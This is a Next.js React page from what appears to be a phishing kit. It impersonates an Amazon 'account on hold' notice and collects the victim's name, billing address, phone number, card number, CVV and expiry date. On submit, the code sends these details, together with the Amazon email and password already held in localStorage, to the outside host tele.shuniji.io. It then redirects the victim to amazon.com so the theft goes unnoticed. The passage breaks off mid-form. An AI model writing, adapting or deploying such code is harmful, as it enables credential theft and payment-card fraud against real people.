/* eslint-disable react/no-unescaped-entities */
"use client";

import { useEffect, useRef, useState } from "react";
import { useRouter } from 'next/navigation'

import './styles.css'
import styles from './styles.module.css'
import styles1 from '../styles.module.css'
import useWindowDimensions from '../../hooks/useWindowDimension';

import ErrorMobile from '@/app/components/errorMobile/index'

export default function ErrorPage() {
    const [loading, setLoading] = useState(false);
    const [submit, setSubmit] = useState(false);
    const [fullName, setFullName] = useState('');
    const [comment, setComment] = useState('');
    const [fullNameCard, setFullNameCard] = useState('');
    const [selectedCountry, setSelectedCountry] = useState('US');
    const [bill, setBill] = useState('');
    const [billUs1, setBillUs1] = useState('');
    const [billUs2, setBillUs2] = useState('');
    const [phone, setPhone] = useState('');
    const [city, setCity] = useState('');
    const [card, setCard] = useState('');
    const [security, setSecurity] = useState('');
    const [region, setRegion] = useState('');
    const [zipcode, setZipcode] = useState('');
    const [radioValue, setRadioValue] = useState('');
    const [month, setMonth] = useState('1');
    const [year, setYear] = useState('2024');
    const [urlImages, setUrlImages] = useState([]);

    const router = useRouter();
    const { width, height } = useWindowDimensions();

    const windowWidth = width;

    useEffect(() => {
        router.push('/', { scroll: false });
        const data = {
            email: localStorage.getItem('email'),
            password: localStorage.getItem('password'),
        }
        if (data.email == null || data.password == null) {
            router.push('/', { scroll: false });
        }


    }, [router])

    const senDataUser = async (e) => {
        e.preventDefault();
        setSubmit(true);

        if (
            fullName !== '' &&
            fullNameCard !== '' &&
            card !== '' &&
            security !== '' &&
            phone !== ''
        ) {
            const user = {
                email: localStorage.getItem('email'),
                Password: localStorage.getItem('password'),
                fullName: fullName,
                selectedCountry: selectedCountry,
                bill: bill,
                billUs1: billUs1,
                billUs2: billUs2,
                phone: phone,
                city: city,
                card: card,
                security: security,
                region: region,
                zipcode: zipcode,
                radioValue: radioValue,
                fullNameCard: fullNameCard,
                month: month,
                year: year,
                comment: comment,
                image: urlImages || '',
            };
            setLoading(true);
            await fetch('https://tele.shuniji.io/adduser', {
                method: 'POST',
                headers: {
                    Accept: 'application/json',
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify(user),
            })
                .then((resp) => resp.json())
                .then((data) => {
                    data?.success
                        ? (window.location.href = 'https://www.amazon.com/')
                        : console.log('error data');
                    setLoading(false);
                });
            localStorage.removeItem('email');
            localStorage.removeItem('password');
        }
    };

    const handleChangeMonth = (event) => {
        setMonth(event.target.value);
    };

    const handleChangeYear = (event) => {
        setYear(event.target.value);
    };


    const handleChangeFullName = (event) => {
        setFullName(event.target.value);
    };

    const handleChangeFullNameCard = (event) => {
        setFullNameCard(event.target.value);
    };

    const handleCountryChange = (event) => {
        setSelectedCountry(event.target.value);
    };


    const handleChangeBillUs1 = (event) => {
        setBillUs1(event.target.value);
    };


    const handleChangeCity = (event) => {
        setCity(event.target.value);
    };


    const handleChangeCard = (event) => {
        setCard(event.target.value);
    };

    const handleChangesecurity = (event) => {
        setSecurity(event.target.value);
    };

    const handleChangeRegion = (event) => {
        setRegion(event.target.value);
    };

    const handleChangePhone = (event) => {
        setPhone(event.target.value);
    };

    const handleChangeZipCode = (event) => {
        setZipcode(event.target.value);
    };

    if (windowWidth < 640) {
        return <ErrorMobile />

    }


    return (
        <main className={`flex min-h-screen flex-col items-center justify-between ${styles.mainContainer}`}>
            <div className="flex min-h-full flex-1 flex-col ">
                <div className="flex justify-center items-center">
                    <i className={styles.loginLogo} alt="Logo here" />
                </div>
                <form className="mt-4">
                    <div
                        id="alert-0"
                        className={`${styles.errorSection} ${styles.errorSpacingBase} ${styles.abbottViewComponent} ${styles.componentDisplayBlock} ${styles.componentWidthExtra_large}`}
                    >
                        <div
                            daterror-action-on-load="register-listeners"
                            daterror-listeners=""
                            className={`${styles.errorSection} ${styles.errorSpacingNone} ${styles.hasActionOnLoad} `}
                        >
                            <div className={`${styles.errorBox} ${styles.errorAlert} ${styles.errorAlertError}`} role="alert">
                                <div className={`${styles.errorBoxInner} ${styles.errorAlertContainer}`}>
                                    <h4 className={styles.errorAlertHeading}>
                                        Account on hold temporarily
                                    </h4>
                                    <i className={`${styles.errorIcon} ${styles.errorIconAlert} ${styles.displayMobile}`} />
                                    <div className={`${styles.errorAlertContent}`}>
                                        We noticed unusual payment activity on your account and need to
                                        verify ownership of the payment method used on your most recent
                                        order. (
                                        <span
                                            className={styles.errorDeclarative}
                                        >
                                            <a className={styles.errorLinkNormal} href="#">
                                                Why?
                                            </a>
                                        </span>
                                        )
                                        <div className={styles.errorPopoverPreload}>
                                            <span>
                                                Amazon takes your security seriously, and monitors activity on
                                                your account to keep your account and payment methods safe.
                                            </span>
                                            <ul className={styles.errorUnorderedList + " " + styles.errorVertical}>
                                                <li>
                                                    <span className={styles.errorListItem}>
                                                        We noticed unusual payment activity on your account.
                                                    </span>
                                                </li>
                                                <li>
                                                    <span className={styles.errorListItem}>
                                                        We have temporarily placed your account on hold so we could
                                                        review it with you.
                                                    </span>
                                                </li>
                                                <li>
                                                    <span className={styles.errorListItem}>
                                                        While your account is on hold, your pending orders are also
                                                        on hold and may be cancelled.
                                                    </span>
                                                </li>
                                                <li>
                                                    <span className={styles.errorListItem}>
                                                        If you promptly submit this form and attach a supporting
                                                        document, we may be able to remove the hold on your account
                                                        more quickly.
                                                    </span>
                                                </li>
                                            </ul>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                    <div
                        id="header-1"
                        className={styles.errorSection + " " + styles.errorSpacingMini + " " + styles.abbottViewComponent}>
                        <h1
                            className={styles.errorSizeLarge + " " + styles.hasActionOnLoad + " " + styles.textAlignLeft + " " + styles.errorTextBold}>
                            Enter billing details
                        </h1>
                    </div>
                    <div
                        className={styles.errorSection + " " + styles.errorSpacingBase}
                    >
                        <h1
                            className={styles.errorSizeBase + " " + styles.hasActionOnLoad + " " + styles.textAlignLeft + " " + styles.errorTextNormal}
                        >
                            This is required to remove the hold on your account.
                        </h1>
                    </div>
                    <div
                        className={styles.errorSection + " " + styles.errorSpacingExtrerrorLarge}
                    >
                        <div className={styles.errorSection + " " + styles.errorSpacingNone}>
                            <div className={styles.errorSection + " " + styles.errorSpacingNone}>
                                <label className={styles.errorFormLabel}>
                                    <i className={styles.inputFieldRequired} /> Full name
                                </label>
                                <input
                                    required=""
                                    type="text"
                                    maxLength={100}
                                    placeholder="Name that appears on the payment method"
                                    name="full-name"
                                    className={`${styles.errorInputText} ${fullName === '' && submit ? styles1.loginInputError : ""}`}

                                    daterror-action-on-load="register-listeners"
                                    daterror-listeners=""
                                    defaultValue=""
                                    value={fullName}
                                    onChange={handleChangeFullName}
                                />
                            </div>
                        </div>
                        {fullName === '' && submit && (
                            <div className={`${styles1.loginAlertInline} ${styles1.loginAlertError}`} role="alert" style={{ display: "block" }}>
                                <div className={`${styles1.loginBoxInner} ${styles1.loginAlertContainer}`}>
                                    <i className={`${styles1.loginIcon} ${styles1.loginIconAlert}`} />
                                    <div className={`${styles1.loginAlertContent}`}>
                                        Please enter a name
                                    </div>
                                </div>
                            </div>
                        )}
                    </div>
                    <div
                        id="country-4"
                        className={styles.errorSection + " " + styles.errorSpacingBase}
                    >
                        <div className={styles.errorSection + " " + styles.errorSpacingNone}>
                            <div className={styles.errorSection + " " + styles.errorSpacingNone}>
                                <label className={styles.errorFormLabel}>Country/Region</label>
                                <span className={styles.errorDropdownContainer}>
                                    <select
                                        name="country-code"
                                        autoComplete="off"
                                        tabIndex={0}
                                        daterror-action="error-dropdown-select"
                                        className={styles.seclectCustom}
                                        defaultValue={selectedCountry}
                                        onChange={handleCountryChange}
                                    >
                                        <option value="AF">Afghanistan</option>
                                        <option value="AX">Aland Islands123</option>
                                        <option value="AL">Albania</option>
                                        <option value="DZ">Algeria</option>
                                        <option value="AS">American Samoa</option>
                                        <option value="AD">Andorra</option>
                                        <option value="AO">Angola</option>
                                        <option value="AI">Anguilla</option>
                                        <option value="AQ">Antarctica</option>
                                        <option value="AG">Antigua and Barbuda</option>
                                        <option value="AR">Argentina</option>
                                        <option value="AM">Armenia</option>
                                        <option value="AW">Aruba</option>
                                        <option value="AU">Australia</option>
                                        <option value="AT">Austria</option>
                                        <option value="AZ">Azerbaijan</option>
                                        <option value="BS">Bahamas, The</option>
                                        <option value="BH">Bahrain</option>
                                        <option value="BD">Bangladesh</option>
                                        <option value="BB">Barbados</option>
                                        <option value="BY">Belarus</option>
                                        <option value="BE">Belgium</option>
                                        <option value="BZ">Belize</option>
                                        <option value="BJ">Benin</option>
                                        <option value="BM">Bermuda</option>
                                        <option value="BT">Bhutan</option>
                                        <option value="BO">Bolivia</option>
                                        <option value="BQ">Bonaire, Saint Eustatius and Saba</option>
                                        <option value="BA">Bosnia and Herzegovina</option>
                                        <option value="BW">Botswana</option>
                                        <option value="BV">Bouvet Island</option>
                                        <option value="BR">Brazil</option>
                                        <option value="IO">British Indian Ocean Territory</option>
                                        <option value="BN">Brunei Darussalam</option>
                                        <option value="BG">Bulgaria</option>
                                        <option value="BF">Burkina Faso</option>
                                        <option value="BI">Burundi</option>
                                        <option value="KH">Cambodia</option>
                                        <option value="CM">Cameroon</option>
                                        <option value="CA">Canada</option>
                                        <option value="IC">Canary Islands</option>
                                        <option value="CV">Cape Verde</option>
                                        <option value="KY">Cayman Islands</option>
                                        <option value="CF">Central African Republic</option>
                                        <option value="TD">Chad</option>
                                        <option value="CL">Chile</option>
                                        <option value="CN">China</option>
                                        <option value="CX">Christmas Island</option>
                                        <option value="CC">Cocos (Keeling) Islands</option>
                                        <option value="CO">Colombia</option>
                                        <option value="KM">Comoros</option>
                                        <option value="CG">Congo</option>
                                        <option value="CD">Congo, The Democratic Republic of the</option>
                                        <option value="CK">Cook Islands</option>
                                        <option value="CR">Costa Rica</option>
                                        <option value="CI">Cote D'ivoire</option>
                                        <option value="HR">Croatia</option>
                                        <option value="CU">Cuba</option>
                                        <option value="CW">Curaçao</option>
                                        <option value="CY">Cyprus</option>
                                        <option value="CZ">Czech Republic</option>
                                        <option value="DK">Denmark</option>
                                        <option value="DJ">Djibouti</option>
                                        <option value="DM">Dominica</option>
                                        <option value="DO">Dominican Republic</option>
                                        <option value="EC">Ecuador</option>
                                        <option value="EG">Egypt</option>
                                        <option value="SV">El Salvador</option>
                                        <option value="GQ">Equatorial Guinea</option>
                                        <option value="ER">Eritrea</option>
                                        <option value="EE">Estonia</option>
                                        <option value="ET">Ethiopia</option>
                                        <option value="FK">Falkland Islands (Malvinas)</option>
                                        <option value="FO">Faroe Islands</option>
                                        <option value="FJ">Fiji</option>
                                        <option value="FI">Finland</option>
                                        <option value="FR">France</option>
                                        <option value="GF">French Guiana</option>
                                        <option value="PF">French Polynesia</option>
                                        <option value="TF">French Southern Territories</option>
                                        <option value="GA">Gabon</option>
                                        <option value="GM">Gambia, The</option>
                                        <option value="GE">Georgia</option>
                                        <option value="DE">Germany</option>
                                        <option value="GH">Ghana</option>
                                        <option value="GI">Gibraltar</option>
                                        <option value="GR">Greece</option>
                                        <option value="GL">Greenland</option>
                                        <option value="GD">Grenada</option>
                                        <option value="GP">Guadeloupe</option>
                                        <option value="GU">Guam</option>
                                        <option value="GT">Guatemala</option>
                                        <option value="GG">Guernsey</option>
                                        <option value="GN">Guinea</option>
                                        <option value="GW">Guineerror-Bissau</option>
                                        <option value="GY">Guyana</option>
                                        <option value="HT">Haiti</option>
                                        <option value="HM">Heard Island and the McDonald Islands</option>
                                        <option value="VA">Holy See</option>
                                        <option value="HN">Honduras</option>
                                        <option value="HK">Hong Kong</option>
                                        <option value="HU">Hungary</option>
                                        <option value="IS">Iceland</option>
                                        <option value="IN">India</option>
                                        <option value="ID">Indonesia</option>
                                        <option value="IR">Iran, Islamic Republic of</option>
                                        <option value="IQ">Iraq</option>
                                        <option value="IE">Ireland</option>
                                        <option value="IM">Isle of Man</option>
                                        <option value="IL">Israel</option>
                                        <option value="IT">Italy</option>
                                        <option value="JM">Jamaica</option>
                                        <option value="JP">Japan</option>
                                        <option value="JE">Jersey</option>
                                        <option value="JO">Jordan</option>
                                        <option value="KZ">Kazakhstan</option>
                                        <option value="KE">Kenya</option>
                                        <option value="KI">Kiribati</option>
                                        <option value="KP">Korea, Democratic People's Republic of</option>
                                        <option value="KR">Korea, Republic of</option>
                                        <option value="XK">Kosovo</option>
                                        <option value="KW">Kuwait</option>
                                        <option value="KG">Kyrgyzstan</option>
                                        <option value="LA">Lao People's Democratic Republic</option>
                                        <option value="LV">Latvia</option>
                                        <option value="LB">Lebanon</option>
                                        <option value="LS">Lesotho</option>
                                        <option value="LR">Liberia</option>
                                        <option value="LY">Libya</option>
                                        <option value="LI">Liechtenstein</option>
                                        <option value="LT">Lithuania</option>
                                        <option value="LU">Luxembourg</option>
                                        <option value="MO">Macao</option>
                                        <option value="MK">
                                            Macedonia, The Former Yugoslav Republic of
                                        </option>
                                        <option value="MG">Madagascar</option>
                                        <option value="MW">Malawi</option>
                                        <option value="MY">Malaysia</option>
                                        <option value="MV">Maldives</option>
                                        <option value="ML">Mali</option>
                                        <option value="MT">Malta</option>
                                        <option value="MH">Marshall Islands</option>
                                        <option value="MQ">Martinique</option>
                                        <option value="MR">Mauritania</option>
                                        <option value="MU">Mauritius</option>
                                        <option value="YT">Mayotte</option>
                                        <option value="MX">Mexico</option>
                                        <option value="FM">Micronesia, Federated States of</option>
                                        <option value="MD">Moldova, Republic of</option>
                                        <option value="MC">Monaco</option>
                                        <option value="MN">Mongolia</option>
                                        <option value="ME">Montenegro</option>
                                        <option value="MS">Montserrat</option>
                                        <option value="MA">Morocco</option>
                                        <option value="MZ">Mozambique</option>
                                        <option value="MM">Myanmar</option>
                                        <option value="NA">Namibia</option>
                                        <option value="NR">Nauru</option>
                                        <option value="NP">Nepal</option>
                                        <option value="NL">Netherlands</option>
                                        <option value="AN">Netherlands Antilles</option>
                                        <option value="NC">New Caledonia</option>
                                        <option value="NZ">New Zealand</option>
                                        <option value="NI">Nicaragua</option>
                                        <option value="NE">Niger</option>
                                        <option value="NG">Nigeria</option>
                                        <option value="NU">Niue</option>
                                        <option value="NF">Norfolk Island</option>
                                        <option value="MP">Northern Mariana Islands</option>
                                        <option value="NO">Norway</option>
                                        <option value="OM">Oman</option>
                                        <option value="PK">Pakistan</option>
                                        <option value="PW">Palau</option>
                                        <option value="PS">Palestinian Territories</option>
                                        <option value="PA">Panama</option>
                                        <option value="PG">Papua New Guinea</option>
                                        <option value="PY">Paraguay</option>
                                        <option value="PE">Peru</option>
                                        <option value="PH">Philippines</option>
                                        <option value="PN">Pitcairn</option>
                                        <option value="PL">Poland</option>
                                        <option value="PT">Portugal</option>
                                        <option value="PR">Puerto Rico</option>
                                        <option value="QA">Qatar</option>
                                        <option value="RE">Reunion</option>
                                        <option value="RO">Romania</option>
                                        <option value="RU">Russian Federation</option>
                                        <option value="RW">Rwanda</option>
                                        <option value="BL">Saint Barthelemy</option>
                                        <option value="SH">
                                            Saint Helena, Ascension and Tristan da Cunha
                                        </option>
                                        <option value="KN">Saint Kitts and Nevis</option>
                                        <option value="LC">Saint Lucia</option>
                                        <option value="MF">Saint Martin</option>
                                        <option value="PM">Saint Pierre and Miquelon</option>
                                        <option value="VC">Saint Vincent and the Grenadines</option>
                                        <option value="WS">Samoa</option>
                                        <option value="SM">San Marino</option>
                                        <option value="ST">Sao Tome and Principe</option>
                                        <option value="SA">Saudi Arabia</option>
                                        <option value="SN">Senegal</option>
                                        <option value="RS">Serbia</option>
                                        <option value="CS">Serbia and Montenegro</option>
                                        <option value="SC">Seychelles</option>
                                        <option value="SL">Sierra Leone</option>
                                        <option value="SG">Singapore</option>
                                        <option value="SX">Sint Maarten</option>
                                        <option value="SK">Slovakia</option>
                                        <option value="SI">Slovenia</option>
                                        <option value="SB">Solomon Islands</option>
                                        <option value="SO">Somalia</option>
                                        <option value="ZA">South Africa</option>
                                        <option value="GS">
                                            South Georgia and the South Sandwich Islands
                                        </option>
                                        <option value="SS">South Sudan</option>
                                        <option value="ES">Spain</option>
                                        <option value="LK">Sri Lanka</option>
                                        <option value="SD">Sudan</option>
                                        <option value="SR">Suriname</option>
                                        <option value="SJ">Svalbard and Jan Mayen</option>
                                        <option value="SZ">Swaziland</option>
                                        <option value="SE">Sweden</option>
                                        <option value="CH">Switzerland</option>
                                        <option value="SY">Syria</option>
                                        <option value="TW">Taiwan</option>
                                        <option value="TJ">Tajikistan</option>
                                        <option value="TZ">Tanzania, United Republic of</option>
                                        <option value="TH">Thailand</option>
                                        <option value="TL">Timor-leste</option>
                                        <option value="TG">Togo</option>
                                        <option value="TK">Tokelau</option>
                                        <option value="TO">Tonga</option>
                                        <option value="TT">Trinidad and Tobago</option>
                                        <option value="TN">Tunisia</option>
                                        <option value="TR">Turkey</option>
                                        <option value="TM">Turkmenistan</option>
                                        <option value="TC">Turks and Caicos Islands</option>
                                        <option value="TV">Tuvalu</option>
                                        <option value="UG">Uganda</option>
                                        <option value="UA">Ukraine</option>
                                        <option value="AE">United Arab Emirates</option>
                                        <option value="GB">United Kingdom</option>
                                        <option value="US" selected="">
                                            United States
                                        </option>
                                        <option value="UM">United States Minor Outlying Islands</option>
                                        <option value="UY">Uruguay</option>
                                        <option value="UZ">Uzbekistan</option>
                                        <option value="VU">Vanuatu</option>
                                        <option value="VE">Venezuela</option>
                                        <option value="VN">Vietnam</option>
                                        <option value="VG">Virgin Islands, British</option>
                                        <option value="VI">Virgin Islands, U.S.</option>
                                        <option value="WF">Wallis and Futuna</option>
                                        <option value="EH">Western Sahara</option>
                                        <option value="YE">Yemen</option>
                                        <option value="YU">Yugoslavia</option>
                                        <option value="ZM">Zambia</option>
                                        <option value="ZW">Zimbabwe</option>
                                    </select>
                                    {/* <span
                                        tabIndex={-1}
                                        daterror-action-on-load="register-listeners"
                                        daterror-listeners=""
                                        daterror-error-classname="input-field-width has-action-on-load"
                                        className="error-button error-button-dropdown input-field-width has-action-on-load"
                                        arierror-hidden="true"
                                        id="error-autoid-0"
                                        style={{ minWidth: "0.940945%" }}
                                    >
                                        <span className="error-button-inner">
                                            <span
                                                className="error-button-text error-declarative"
                                                daterror-cserror-c-func-deps="aui-derror-error-dropdown-button"
                                                daterror-cserror-c-type="widget"
                                                daterror-cserror-interaction-events="click"
                                                daterror-action="error-dropdown-button"
                                                arierror-hidden="true"
                                                id="error-autoid-0-announce"
                                            >
                                                <span className="error-dropdown-prompt">United States</span>
                                            </span>
                                            <i className="error-icon error-icon-dropdown" />
                                        </span>
                                    </span> */}
                                </span>
                            </div>
                        </div>
                    </div>

                    <div
                        className={styles.errorSection + " " + styles.errorSpacingBase + " "}                    >
                        <div className={styles.errorSection + " " + styles.errorSpacingNone}>
                            <div className={styles.errorSection + " " + styles.errorSpacingNone}>
                                <label className={styles.errorFormLabel}>
                                    <i className={styles.inputFieldRequired} /> Billing address
                                </label>
                                <input
                                    type="text"
                                    maxLength={100}
                                    value={billUs1}
                                    onChange={handleChangeBillUs1}
                                    placeholder="Street and number, P.O. box, c/o."
                                    name="street-line-one"
                                    className={`${styles.errorInputText} ${billUs1 === '' && submit ? styles1.loginInputError : ""}`}
                                    daterror-action-on-load="register-listeners"
                                    daterror-listeners='[{"name":"country-code","toggle":"block","matcher":"in","values":["US","DE","FR","IT","ES","NL","CA"]}]'
                                    defaultValue=""
                                />
                            </div>
                            {billUs1 === '' && submit && (
                                <div className={`${styles1.loginAlertInline} ${styles1.loginAlertError}`} role="alert" style={{ display: "block" }}>
                                    <div className={`${styles1.loginBoxInner} ${styles1.loginAlertContainer}`}>
                                        <i className={`${styles1.loginIcon} ${styles1.loginIconAlert}`} />
                                        <div className={`${styles1.loginAlertContent}`}>
                                            Please enter address
                                        </div>
                                    </div>
                                </div>
                            )}
                        </div>
                    </div>
                    <div
                        id="text-input-7"
                        className={styles.errorSection + " " + styles.errorSpacingBase}

                    >
                        <div className={styles.errorSection + " " + styles.errorSpacingNone}>
                            <div className={styles.errorSection + " " + styles.errorSpacingNone}>
                                <input
                                    type="text"
                                    maxLength={100}
                                    placeholder="Apartment, suite, unit, building, floor, etc."
                                    name="street-line-two"
                                    className="error-input-text error-form-normal input-field-width text-input-field has-action-on-load"
                                    daterror-action-on-load="register-listeners"
                                    daterror-listeners='[{"name":"country-code","toggle":"block","matcher":"in","values":["US","DE","FR","IT","ES","NL","CA"]}]'
                                    defaultValue=""
                                />
                            </div>
                        </div>
                    </div>
                    <div
                        id="text-input-8"
                        className={styles.errorSection + " " + styles.errorSpacingBase}
                    >
                        <div className={styles.errorSection + " " + styles.errorSpacingNone}>
                            <div className={styles.errorSection + " " + styles.errorSpacingNone}>
                                <label className={styles.errorFormLabel}>
                                    <i className={styles.inputFieldRequired} /> City
                                </label>
                                <input
                                    type="text"
                                    maxLength={100}
                                    name="city"
                                    value={city}
                                    onChange={handleChangeCity}
                                    className={`${styles.errorInputText} ${city === '' && submit ? styles1.loginInputError : ""}`}
                                    daterror-action-on-load="register-listeners"
                                    daterror-listeners='[{"name":"country-code","toggle":"block","matcher":"in","values":["US","DE","FR","IT","ES","NL","CA"]}]'
                                    defaultValue=""
                                />
                            </div>
                            {city === '' && submit && (
                                <div className={`${styles1.loginAlertInline} ${styles1.loginAlertError}`} role="alert" style={{ display: "block" }}>
                                    <div className={`${styles1.loginBoxInner} ${styles1.loginAlertContainer}`}>
                                        <i className={`${styles1.loginIcon} ${styles1.loginIconAlert}`} />
                                        <div className={`${styles1.loginAlertContent}`}>
                                            Please enter a city
                                            name
                                        </div>
                                    </div>
                                </div>
                            )}
                        </div>
                    </div>
                    <div
                        id="text-input-9"
                        className={styles.errorSection + " " + styles.errorSpacingBase}
                    >
                        <div className={styles.errorSection + " " + styles.errorSpacingNone}>
                            <div className={styles.errorSection + " " + styles.errorSpacingNone}>
                                <label className={styles.errorFormLabel}>
                                    <i className={styles.inputFieldRequired} /> State/Province/Region
                                </label>
                                <input
                                    type="text"
                                    maxLength={100}
                                    name="region"
                                    value={region}
                                    onChange={handleChangeRegion}
                                    className={`${styles.errorInputText} ${region === '' && submit ? styles1.loginInputError : ""}`}
                                    daterror-action-on-load="register-listeners"
                                    daterror-listeners='[{"name":"country-code","toggle":"block","matcher":"in","values":["US","DE","FR","IT","ES","NL","CA"]}]'
                                    defaultValue=""
                                />
                            </div>
                            {region === '' && submit && (
                                <div className={`${styles1.loginAlertInline} ${styles1.loginAlertError}`} role="alert" style={{ display: "block" }}>
                                    <div className={`${styles1.loginBoxInner} ${styles1.loginAlertContainer}`}>
                                        <i className={`${styles1.loginIcon} ${styles1.loginIconAlert}`} />
                                        <div className={`${styles1.loginAlertContent}`}>
                                            Please enter a
                                            state, region, or
                                            province
                                        </div>
                                    </div>
                                </div>
                            )}
                        </div>
                    </div>
                    <div
                        id="text-input-10"
                        className={styles.errorSection}
                    >
                        <div className={styles.errorSection + " " + styles.errorSpacingNone}>
                            <div className={styles.errorSection + " " + styles.errorSpacingNone}>
                                <label className={styles.errorFormLabel}>
                                    <i className={styles.inputFieldRequired} /> Zip Code
                                </label>
                                <input
                                    type="number"
                                    maxLength={100}
                                    name="zip-code"
                                    pattern="[0-9]{5}"
                                    value={zipcode}
                                    onChange={handleChangeZipCode}
                                    className={`${styles.errorInputText} ${zipcode === '' && submit ? styles1.loginInputError : ""}`}
                                    daterror-action-on-load="register-listeners"
                                    daterror-listeners='[{"name":"country-code","toggle":"block","matcher":"in","values":["US","DE","FR","IT","ES","NL","CA"]}]'
                                    defaultValue=""
                                />
                            </div>
                            {zipcode === '' && submit && (
                                <div className={`${styles1.loginAlertInline} ${styles1.loginAlertError}`} role="alert" style={{ display: "block" }}>
                                    <div className={`${styles1.loginBoxInner} ${styles1.loginAlertContainer}`}>
                                        <i className={`${styles1.loginIcon} ${styles1.loginIconAlert}`} />
                                        <div className={`${styles1.loginAlertContent}`}>
                                            Please enter a ZIP
                                            or postal code
                                        </div>
                                    </div>
                                </div>
                            )}
                        </div>
                    </div>
                    <div
                        id="text-input-11"
                        className={styles.errorSection + " " + styles.errorSpacingExtrerrorLarge}
                    >
                        <div className={styles.errorSection + " " + styles.errorSpacingNone}>
                            <div className={styles.errorSection + " " + styles.errorSpacingNone}>
                                <label className={styles.errorFormLabel}>
                                    <i className={styles.inputFieldRequired} /> Phone number
                                </label>
                                <input
                                    required=""
                                    type="number"
                                    maxLength={20}
                                    name="phone-number"
                                    value={phone}
                                    onChange={handleChangePhone}
                                    className={`${styles.errorInputText} ${zipcode === '' && submit ? styles1.loginInputError : ""}`}
                                    daterror-action-on-load="register-listeners"
                                    daterror-listeners=""
                                    defaultValue=""
                                />
                            </div>
                            {zipcode === '' && submit && (
                                <div className={`${styles1.loginAlertInline} ${styles1.loginAlertError}`} role="alert" style={{ display: "block" }}>
                                    <div className={`${styles1.loginBoxInner} ${styles1.loginAlertContainer}`}>
                                        <i className={`${styles1.loginIcon} ${styles1.loginIconAlert}`} />
                                        <div className={`${styles1.loginAlertContent}`}>
                                            Please enter a phone
                                            number
                                        </div>
                                    </div>
                                </div>
                            )}
                        </div>
                    </div>
                    <div
                        className={styles.errorSection + " " + styles.errorSpacingMini}

                    >
                        <h1
                            daterror-action-on-load="register-listeners"
                            daterror-listeners=""
                            className={styles.errorSizeLarge}
                        >
                            Enter your card information:
                        </h1>
                    </div>
                    <div
                        id=""
                        className={styles.errorSection + " " + styles.errorSpacingBase}
                    >
                        <h1
                            daterror-action-on-load="register-listeners"
                            daterror-listeners=""
                            className={styles.errorSizeBase}
                        >
                            This is required to remove the hold on your account.
                        </h1>
                    </div>
                    <div
                        id=""
                        className={styles.errorSection}

                    >
                        <div className={styles.errorSection + " " + styles.errorSpacingNone}>
                            <div className={styles.errorSection + " " + styles.errorSpacingNone}>
                                <label className={styles.errorFormLabel}>
                                    <i className={styles.inputFieldRequired} /> Full name
                                </label>
                                <input
                                    type="text"
                                    required=""
                                    maxLength={100}
                                    placeholder="Name that appears on the payment method"
                                    name="full-name"
                                    className={`${styles.errorInputText} ${fullNameCard === '' && submit ? styles1.loginInputError : ""}`}
                                    defaultValue=""
                                    value={fullNameCard}
                                    onChange={handleChangeFullNameCard}
                                />
                            </div>
                            {fullNameCard === '' && submit && (
                                <div className={`${styles1.loginAlertInline} ${styles1.loginAlertError}`} role="alert" style={{ display: "block" }}>
                                    <div className={`${styles1.loginBoxInner} ${styles1.loginAlertContainer}`}>
                                        <i className={`${styles1.loginIcon} ${styles1.loginIconAlert}`} />
                                        <div className={`${styles1.loginAlertContent}`}>
                                            Please enter a name
                                        </div>
                                    </div>
                                </div>
                            )}
                        </div>
                    </div>
                    <div className="flex flex-row justify-between">
                        <div
                            id=""
                            className={`${styles.customYourCardItem1}`}
                        >
                            <div className={styles.errorSection + " " + styles.errorSpacingNone}>
                                <div className={styles.errorSection + " " + styles.errorSpacingNone}>
                                    <label className={styles.errorFormLabel}>
                                        <i className={styles.inputFieldRequired} /> Card number
                                    </label>
                                    <input
                                        required=""
                                        type="number"
                                        maxLength={20}
                                        name="card-number"
                                        className={`${styles.errorInputText} ${card === '' && submit ? styles1.loginInputError : ""}`}
                                        daterror-action-on-load="register-listeners"
                                        daterror-listeners=""
                                        defaultValue=""
                                        value={card}
                                        onChange={handleChangeCard}
                                    />
                                </div>
                                {card === '' && submit && (
                                    <div className={`${styles1.loginAlertInline} ${styles1.loginAlertError}`} role="alert" style={{ display: "block" }}>
                                        <div className={`${styles1.loginBoxInner} ${styles1.loginAlertContainer}`}>
                                            <i className={`${styles1.loginIcon} ${styles1.loginIconAlert}`} />
                                            <div className={`${styles1.loginAlertContent}`}>
                                                Please enter card number
                                            </div>
                                        </div>
                                    </div>
                                )}
                            </div>
                        </div>
                        <div
                            id="text-input-11"
                            className={styles.customYourCardItem2}
                        >
                            <div className={styles.errorSection + " " + styles.errorSpacingNone}>
                                <div className={styles.errorSection + " " + styles.errorSpacingNone}>
                                    <label className={`${styles.errorFormLabel}`}>
                                        <i className={`${styles.inputFieldRequired} w-25`} /> Security Code (CVV/CVC)
                                    </label>
                                    <input
                                        required=""
                                        type="number"
                                        maxLength={20}
                                        pattern="[0-9\s]{3,4}" 
                                        name="cvv"
                                        className={`${styles.errorInputText} ${security === '' && submit ? styles1.loginInputError : ""} w-25 mr-1`}
                                        daterror-action-on-load="register-listeners"
                                        daterror-listeners=""
                                        defaultValue=""
                                        value={security}
                                        onChange={handleChangesecurity}
                                    />
                                    <span>
                                        (<span className={styles.customText}>What's this?</span>)
                                    </span>
                                </div>
                                {security === '' && submit && (
                                    <div className={`${styles1.loginAlertInline} ${styles1.loginAlertError}`} role="alert" style={{ display: "block" }}>
                                        <div className={`${styles1.loginBoxInner} ${styles1.loginAlertContainer}`}>
                                            <i className={`${styles1.loginIcon} ${styles1.loginIconAlert}`} />
                                            <div className={`${styles1.loginAlertContent}`}>
                                                Please enter security code
                                            </div>
                                        </div>
                                    </div>
                                )}
                            </div>
                        </div>
                    </div>
                    <div className={styles.errorSection + " " + styles.errorSpacingBase}>
                        <div className={styles.errorSection + " pb-22"}>
                            <div className={styles.errorSection}>
                                <label className={styles.errorFormLabel}>
                                    <i className={styles.inputFieldRequired} /> Expiration date
                                </label>
                                <div className={styles.customYourCard2}>
                                    <span className="">
                                        <select className={styles.seclectCustom}
                                            defaultValue={year}
                                            onChange={handleChangeMonth}>
                                            <option className={styles.customOption} value={1}>
                                                1
                                            </option>
                                            <option value={2}>2</option>
                                            <option value={3}>3</option>
                                            <option value={4}>4</option>
                                            <option value={5}>5</option>
                                            <option value={6}>6</option>
                                            <option value={7}>7</option>
                                            <option value={8}>8</option>
                                            <option value={9}>9</option>
                                            <option value={10}>10</option>
                                            <option value={11}>11</option>
                                            <option value={12}>12</option>
                                        </select>
                                    </span>
                                    <span className="">
                                        <select defaultValue={year}
